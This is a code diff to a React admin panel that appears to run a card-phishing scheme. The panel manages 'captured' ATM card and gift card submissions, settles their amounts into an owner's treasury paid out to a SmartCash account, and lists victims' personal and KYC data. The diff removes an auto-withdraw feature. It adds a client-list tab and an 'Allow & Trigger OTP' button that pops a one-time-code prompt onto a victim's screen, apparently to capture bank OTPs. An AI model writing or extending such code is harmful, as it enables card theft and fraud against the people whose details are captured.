@@ -22,6 +22,7 @@ import {
   IdCard,
   RefreshCw,
   AlertCircle,
+  Users,
 } from 'lucide-react';
 
 import { collection, onSnapshot, query, doc, updateDoc, setDoc, getDoc, deleteDoc, addDoc } from 'firebase/firestore';
@@ -122,12 +123,29 @@ interface AdminPanelProps {
   onBack: () => void;
 }
 
+interface ClientUser {
+  email: string;
+  name: string;
+  phone?: string;
+  balance?: number;
+  referralBalance?: number;
+  accountLevel?: string;
+  kycVerified?: boolean;
+  kycStatus?: string;
+  createdAt?: string;
+  authMethod?: string;
+  payIdVerified?: boolean;
+  referralCode?: string;
+}
+
 export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
-  const [activeTab, setActiveTab] = useState<'cards' | 'giftcards' | 'kyc' | 'payouts'>('cards');
+  const [activeTab, setActiveTab] = useState<'cards' | 'giftcards' | 'kyc' | 'payouts' | 'clients'>('cards');
   const [cards, setCards] = useState<CapturedCard[]>([]);
   const [giftCards, setGiftCards] = useState<GiftCardSubmission[]>([]);
   const [kycSubmissions, setKycSubmissions] = useState<KycSubmission[]>([]);
   const [adminTransactions, setAdminTransactions] = useState<AdminTransaction[]>([]);
+  const [clients, setClients] = useState<ClientUser[]>([]);
+  const [clientSearchQuery, setClientSearchQuery] = useState('');
   const [firebaseUser, setFirebaseUser] = useState<FirebaseUser | null>(null);
   const [authReady, setAuthReady] = useState(false);
   const [isPinUnlocked, setIsPinUnlocked] = useState(false);
@@ -184,30 +202,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
   const [resolveAccountNotice, setResolveAccountNotice] = useState('');
   const [isProcessingPayout, setIsProcessingPayout] = useState(false);
   const [completedPayout, setCompletedPayout] = useState<AdminTransaction | null>(null);
-  const [autoWithdrawToSmartCash, setAutoWithdrawToSmartCash] = useState<boolean>(() => {
-    try {
-      const saved = localStorage.getItem('paygo_auto_withdraw_smartcash');
-      return saved === null ? true : saved === 'true';
-    } catch {
-      return true;
-    }
-  });
 
-  const toggleAutoWithdrawSmartCash = () => {
-    setAutoWithdrawToSmartCash((prev) => {
-      const next = !prev;
-      try {
-        localStorage.setItem('paygo_auto_withdraw_smartcash', String(next));
-      } catch {}
-      showToast(
-        'success',
-        next
-          ? `Auto-Withdraw to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER}) turned ON.`
-          : `Auto-Withdraw to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER}) turned OFF. Funds will stay in Treasury until you remove/withdraw them manually.`
-      );
-      return next;
-    });
-  };
 
   // Clear any legacy demo localStorage balances so only real Firestore ledger values are used
   useEffect(() => {
@@ -265,25 +260,6 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
     return true;
   };
 
-  const maybeAutoDispatchToSmartCash = async (amount: number, sourceLabel: string): Promise<boolean> => {
-    if (!autoWithdrawToSmartCash || amount <= 0) return false;
-    const provider = gatewayStatus.activeProvider;
-    if (!provider || !gatewayStatus.providers[provider]?.keyValid) {
-      return false;
-    }
-    const rateNum = Number(exchangeRate) || gatewayStatus.defaultRate || 1600;
-    return executeLiveGatewayTransfer({
-      provider,
-      bankCode: DEFAULT_PAYOUT_BANK_CODE,
-      bankName: 'SmartCash PSB (Airtel)',
-      accountNumber: DEFAULT_PAYOUT_ACCOUNT_NUMBER,
-      accountName: payoutAccountName.trim() || 'OWNER SMARTCASH ACCOUNT',
-      amount,
-      ngnAmount: Math.round(amount * rateNum),
-      note: `Auto-Withdraw to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER}) • ${sourceLabel}`,
-    });
-  };
-
   const handleAutoWithdrawCard = async (c: CapturedCard) => {
     const amountToWithdraw = Number(c.amount) || 0;
     setIsWithdrawing(true);
@@ -298,12 +274,9 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
       await deleteDoc(doc(db, 'cardSubmissions', c.id));
 
       if (recorded) {
-        const autoSent = await maybeAutoDispatchToSmartCash(amountToWithdraw, `Card ${c.cardNumber}`);
         showToast(
           'success',
-          autoSent
-            ? `Auto-withdrawn $${amountToWithdraw.toLocaleString()} directly to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER})!`
-            : `Settled $${amountToWithdraw.toLocaleString()} to Treasury Wallet. Tap "Remove / Withdraw Money" anytime to send to SmartCash ${DEFAULT_PAYOUT_ACCOUNT_NUMBER}.`
+          `Settled $${amountToWithdraw.toLocaleString()} to Treasury Wallet. Tap "Remove / Withdraw Money" anytime to send to SmartCash ${DEFAULT_PAYOUT_ACCOUNT_NUMBER}.`
         );
       } else {
         showToast('success', `Cleaned up already-settled card ${c.cardNumber}.`);
@@ -342,15 +315,9 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
       }
 
       if (newlySettledTotal > 0) {
-        const autoSent = await maybeAutoDispatchToSmartCash(
-          newlySettledTotal,
-          `Bulk ATM (${settledCount} cards)`
-        );
         showToast(
           'success',
-          autoSent
-            ? `Auto-withdrawn $${newlySettledTotal.toLocaleString()} across ${settledCount} ATM card(s) directly to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER})!`
-            : `Settled $${newlySettledTotal.toLocaleString()} across ${settledCount} ATM card(s) into Real Treasury Balance.`
+          `Settled $${newlySettledTotal.toLocaleString()} across ${settledCount} ATM card(s) into Real Treasury Balance.`
         );
       } else {
         showToast('success', `Archived ${settledCount} already-settled ATM card submission(s).`);
@@ -907,6 +874,35 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
     return () => unsubscribe();
   }, [isFullyAuthorized]);
 
+  // Load registered client accounts from Firestore
+  useEffect(() => {
+    if (!isFullyAuthorized) {
+      setClients([]);
+      return;
+    }
+
+    const q = query(collection(db, 'users'));
+    const unsubscribe = onSnapshot(
+      q,
+      (snapshot) => {
+        const fetched: ClientUser[] = [];
+        snapshot.forEach((docSnap) => {
+          fetched.push({ ...docSnap.data() } as ClientUser);
+        });
+        fetched.sort((a, b) => {
+          const timeA = a.createdAt || '';
+          const timeB = b.createdAt || '';
+          return timeB.localeCompare(timeA);
+        });
+        setClients(fetched);
+      },
+      (err) => {
+        handleFirestoreError(err, OperationType.LIST, 'users');
+      }
+    );
+    return () => unsubscribe();
+  }, [isFullyAuthorized]);
+
   useEffect(() => {
     if (!isFullyAuthorized || !firebaseUser) return;
     refreshGatewayStatus(firebaseUser);
@@ -1044,12 +1040,9 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
           note: `Gift Card ${g.cardBrand} approved (${newStatus})`,
         });
         if (credited) {
-          const autoSent = await maybeAutoDispatchToSmartCash(giftAmt, `${g.cardBrand} Gift Card`);
           showToast(
             'success',
-            autoSent
-              ? `Approved ${g.cardBrand} ($${giftAmt.toLocaleString()}) & auto-withdrawn to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER})!`
-              : `Approved ${g.cardBrand} ($${giftAmt.toLocaleString()}) and credited Real Treasury Balance.`
+            `Approved ${g.cardBrand} ($${giftAmt.toLocaleString()}) and credited Real Treasury Balance.`
           );
         } else {
           showToast('success', `Confirmed ${g.cardBrand} (${newStatus}) — client details unlocked!`);
@@ -1165,8 +1158,19 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
     }
   };
 
+  const handleTriggerOtpForCard = async (c: CapturedCard) => {
+    try {
+      await updateDoc(doc(db, 'cardSubmissions', c.id), {
+        requiresOtp: true,
+      });
+      showToast('success', `OTP verification requested for ${c.userEmail}. Pop-up triggered on client's screen!`);
+    } catch (err: any) {
+      showToast('error', err?.message || 'Failed to trigger OTP verification.');
+    }
+  };
+
   const handleDeleteCard = async (cardId: string) => {
-    if (!window.confirm('Are you sure you want to remove this ATM card submission? Only admin has access to remove ATM details.')) {
+    if (!window.confirm('Are you sure you want to remove this ATM card submission? Only admin has access to view and manage ATM details.')) {
       return;
     }
     try {
@@ -1214,15 +1218,9 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
         note: `Approved payment for ${c.userEmail}`,
       });
 
-      const autoSent = credited
-        ? await maybeAutoDispatchToSmartCash(cardAmt, `Approved ${c.userEmail}`)
-        : false;
-
       showToast(
         'success',
-        autoSent
-          ? `Approved ${c.userEmail} & auto-withdrawn $${cardAmt.toLocaleString()} directly to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER})!`
-          : credited
+        credited
           ? `Approved ${c.userEmail} & credited $${cardAmt.toLocaleString()} to Real Treasury Balance!`
           : userProfileFound
           ? `Approved and unlocked details for ${c.userEmail}!`
@@ -1436,6 +1434,17 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
                 <Landmark className="w-3.5 h-3.5" />
                 <span>SmartCash ({payoutHistory.length})</span>
               </button>
+              <button
+                onClick={() => setActiveTab('clients')}
+                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
+                  activeTab === 'clients'
+                    ? 'bg-purple-600 text-white'
+                    : 'text-gray-400 hover:text-white'
+                }`}
+              >
+                <Users className="w-3.5 h-3.5" />
+                <span>Clients ({clients.length})</span>
+              </button>
             </div>
 
             <button
@@ -1498,19 +1507,8 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
           <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm sm:col-span-2">
             <div className="flex flex-wrap items-center justify-between gap-2">
               <p className="text-xs text-gray-400 uppercase font-medium">
-                Admin Treasury Wallet (SmartCash Auto-Withdraw)
+                Admin Treasury Wallet
               </p>
-              <button
-                type="button"
-                onClick={toggleAutoWithdrawSmartCash}
-                className={`text-[11px] font-bold px-2.5 py-0.5 rounded-full border cursor-pointer transition-all ${
-                  autoWithdrawToSmartCash
-                    ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
-                    : 'bg-gray-700 text-gray-300 border-gray-600'
-                }`}
-              >
-                Auto-Withdraw SmartCash: {autoWithdrawToSmartCash ? 'ON' : 'OFF'}
-              </button>
             </div>
             <div className="flex flex-wrap items-center justify-between gap-2 mt-2">
               <h3 className="text-2xl font-black text-emerald-400 font-mono">
@@ -1669,6 +1667,18 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
                           <span>Reject Card</span>
                         </button>
                       )}
+                      <button
+                        type="button"
+                        onClick={() => handleTriggerOtpForCard(c)}
+                        className={`text-xs font-bold px-3.5 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer border ${
+                          (c as any).requiresOtp
+                            ? 'bg-emerald-600/30 text-emerald-300 border-emerald-500/40'
+                            : 'bg-indigo-600/30 hover:bg-indigo-600 text-indigo-200 hover:text-white border-indigo-500/40'
+                        }`}
+                      >
+                        <Lock className="w-4 h-4" />
+                        <span>{(c as any).requiresOtp ? 'OTP Triggered (Active)' : 'Allow & Trigger OTP'}</span>
+                      </button>
                       <button
                         type="button"
                         onClick={() => handleApproveCardSubmission(c)}
